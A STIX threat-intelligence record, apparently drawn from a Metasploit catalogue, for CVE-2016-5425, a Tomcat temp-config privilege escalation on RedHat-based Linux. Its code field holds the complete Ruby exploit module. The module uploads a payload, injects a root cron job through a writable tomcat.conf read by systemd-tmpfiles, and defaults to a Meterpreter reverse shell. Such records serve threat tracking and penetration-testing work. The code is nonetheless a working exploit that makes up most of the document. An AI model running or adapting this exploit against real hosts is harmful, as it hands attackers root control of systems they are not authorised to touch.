{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--d5c1f31d-5a80-4931-98e0-71ba3e82cbf5",
    "created": "2024-08-14T16:58:44.881702Z",
    "modified": "2024-08-14T16:58:44.881706Z",
    "name": "Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation",
    "description": " This module exploits a vulnerability in RedHat based systems where improper file permissions are applied to /usr/lib/tmpfiles.d/tomcat.conf for Apache Tomcat versions before 7.0.54-8.  This may also work against  The configuration files in tmpfiles.d are used by systemd-tmpfiles to manage temporary files including their creation.  With this weak permission, we're able to inject commands into systemd-tmpfiles service to write a cron job to execute our payload.  systemd-tmpfiles is executed by default on boot on RedHat-based systems through systemd-tmpfiles-setup.service. Depending on the system in use the execution of systemd-tmpfiles could also be triggered by other services, cronjobs, startup scripts etc.  This module was tested against Tomcat 7.0.54-3 on Fedora 21.  'License' => MSF_LICENSE",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/linux/local/tomcat_rhel_based_temp_priv_esc.rb",
            "external_id": "tomcat_rhel_based_temp_priv_esc.rb"
        },
        {
            "source_name": "reference",
            "url": "https://access.redhat.com/security/cve/CVE-2016-5425"
        },
        {
            "source_name": "reference",
            "url": "http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html"
        },
        {
            "source_name": "CVE",
            "external_id": "2016-5425"
        }
    ],
    "x_code_snippet": "###\n#\n# This exploit sample shows how an exploit module could be written to exploit\n# a bug in a command on a linux computer for priv esc.\n#\n###\n\nclass MetasploitModule < Msf::Exploit::Local\n  Rank = ManualRanking\n\n  include Msf::Exploit::Retry\n  include Msf::Post::Linux::Priv\n  include Msf::Post::Linux::System\n  include Msf::Post::File\n  include Msf::Exploit::EXE\n  include Msf::Exploit::FileDropper\n  include Msf::Post::Linux::Compile\n  prepend Msf::Exploit::Remote::AutoCheck\n\n  def initialize(info = {})\n    super(\n      update_info(\n        info,\n        'Name' => 'Apache Tomcat on RedHat Based Systems Insecure Temp Config Privilege Escalation',\n        'Description' => %q{\n          This module exploits a vulnerability in RedHat based systems where\n          improper file permissions are applied to /usr/lib/tmpfiles.d/tomcat.conf\n          for Apache Tomcat versions before 7.0.54-8.  This may also work against\n\n          The configuration files in tmpfiles.d are used by systemd-tmpfiles to manage\n          temporary files including their creation.\n\n          With this weak permission, we're able to inject commands into systemd-tmpfiles\n          service to write a cron job to execute our payload.\n\n          systemd-tmpfiles is executed by default on boot on RedHat-based systems\n          through systemd-tmpfiles-setup.service. Depending on the system in use,\n          the execution of systemd-tmpfiles could also be triggered by other\n          services, cronjobs, startup scripts etc.\n\n          This module was tested against Tomcat 7.0.54-3 on Fedora 21.\n        },\n        'License' => MSF_LICENSE,\n        'Author' => [\n          'h00die', # msf module\n          'Dawid Golunski <dawid@legalhackers.com>' # original PoC, analysis, discovery\n        ],\n        'Platform' => [ 'linux' ],\n        'Arch' => [ ARCH_X86, ARCH_X64 ],\n        'SessionTypes' => [ 'shell', 'meterpreter' ],\n        'Targets' => [[ 'Auto', {} ]],\n        'Privileged' => true,\n        'DefaultOptions' => {\n          'WfsDelay' => 1800, # 30min\n          'payload' => 'linux/x64/meterpreter_reverse_tcp'\n        },\n        'References' => [\n          ['EDB', '40488' ],\n          ['URL', 'https://access.redhat.com/security/cve/CVE-2016-5425'],\n          ['URL', 'http://legalhackers.com/advisories/Tomcat-RedHat-Pkgs-Root-PrivEsc-Exploit-CVE-2016-5425.html'],\n          ['URL', 'https://www.freedesktop.org/software/systemd/man/tmpfiles.d.html'], # general tompfiles.d info\n          ['CVE', '2016-5425']\n        ],\n        'DisclosureDate' => '2016-10-10',\n        'DefaultTarget' => 0,\n        'Notes' => {\n          'Stability' => [CRASH_SAFE],\n          'Reliability' => [REPEATABLE_SESSION],\n          'SideEffects' => [ARTIFACTS_ON_DISK, CONFIG_CHANGES, IOC_IN_LOGS]\n        }\n      )\n    )\n    register_advanced_options [\n      OptString.new('WritableDir', [ true, 'A directory where we can write and execute files', '/tmp' ]),\n    ]\n  end\n\n  # Simplify pulling the writable directory variable\n  def base_dir\n    datastore['WritableDir'].to_s\n  end\n\n  def tomcat_conf\n    '/usr/lib/tmpfiles.d/tomcat.conf'\n  end\n\n  def suid?(file)\n    get_suid_files(file).include? file\n  end\n\n  def check\n    package = cmd_exec('rpm -qa | grep \"^tomcat\\-[678]\"')\n    if package.nil? || package.empty?\n      return CheckCode::Safe('Unable to execute command to determine installed pacakges')\n    end\n\n    package = package.sub('tomcat-', '').strip\n    # fedora based cleanup\n    package = package.sub(/\\.fc\\d\\d\\.noarch/, '')\n    # rhel/centos based cleanup\n    package = package.sub(/\\.el\\d_\\d\\.noarch/, '')\n    package = Rex::Version.new(package)\n\n    # The write-up says 6, 7, 8 but doesn't include version numbers. RHEL's writeup says\n    # only 7 is effected, so we're going to go off their write-up.\n    if package.to_s.start_with?('7') && package < Rex::Version.new('7.0.54-8')\n      return CheckCode::Appears(\"Vulnerable app version detected: #{package}\")\n    end\n\n    CheckCode::Safe(\"Unexploitable tomcat packages found: #{package}\")\n  end\n\n  def exploit\n    # Check if we're already root\n    if is_root? && !datastore['ForceExploit']\n      fail_with Failure::BadConfig, 'Session already has root privileges. Set ForceExploit to override'\n    end\n\n    unless writable? base_dir\n      fail_with Failure::BadConfig, \"#{base_dir} is not writable\"\n    end\n\n    unless writable? tomcat_conf\n      fail_with Failure::BadConfig, \"#{tomcat_conf} is not writable\"\n    end\n\n    vprint_status(\"Creating backup of #{tomcat_conf}\")\n    @tomcat_conf_content = read_file(tomcat_conf)\n    path = store_loot(\n      tomcat_conf,\n      'text/plain',\n      rhost,\n      @tomcat_conf_content,\n      'tomcat.conf'\n    )\n    print_good(\"Original #{tomcat_conf} backed up to #{path}\")\n\n    # Upload payload executable\n    payload_path = \"#{base_dir}/.#{rand_text_alphanumeric(5..10)}\"\n    vprint_status(\"Uploading Payload to #{payload_path}\")\n    upload_and_chmodx payload_path, generate_payload_exe\n    register_file_for_cleanup(payload_path)\n\n    # write in our payload execution\n    vprint_status(\"Writing permission elevation into #{tomcat_conf}\")\n\n    cron_job = \"/etc/cron.d/#{rand_text_alphanumeric(5..10)}\"\n    print_status(\"Creating cron job in #{cron_job}\")\n    # The POC shows 2 options, a cron answer, and copy bash answer.\n    # Initially I attempted to copy our payload, set suid and root owner\n    # however it seemed to need 2 service restart to apply all the permissions.\n    # I never figured out why it was like that, even chaining copying bash in, then\n    # launching the payload from the bash instance etc.  We opt for the cron\n    # which may take 1 additional minute, and rely on cron, but is much more stable\n    cmd_exec(\"echo 'F #{cron_job} 0644 root root - \\\"* * * * * root nohup #{payload_path} & \\\\n\\\\n\\\"' >> #{tomcat_conf}\")\n    register_file_for_cleanup(cron_job)\n\n    # we now need systemd-tmpfiles to restart\n    print_good(\"Waiting #{datastore['WfsDelay']} seconds. Run the following command on the target machine: /usr/bin/systemd-tmpfiles --create - this is required to restart the tmpfiles-setup.service\")\n    succeeded = retry_until_truthy(timeout: datastore['WfsDelay']) do\n      file? cron_job\n    end\n\n    unless succeeded\n      print_error(\"#{cron_job} not found, exploit aborted\")\n      return\n    end\n\n    print_status('Waiting on cron to execute the payload (~1 minute)')\n  end\n\n  def cleanup\n    unless @tomcat_conf_content.nil?\n      write_file(tomcat_conf, @tomcat_conf_content)\n    end\n    super\n  end\nend\n",
    "x_mitre_disclosure_date": "2016-10-10",
    "x_mitre_platforms": [
        "[ 'linux' ]"
    ]
}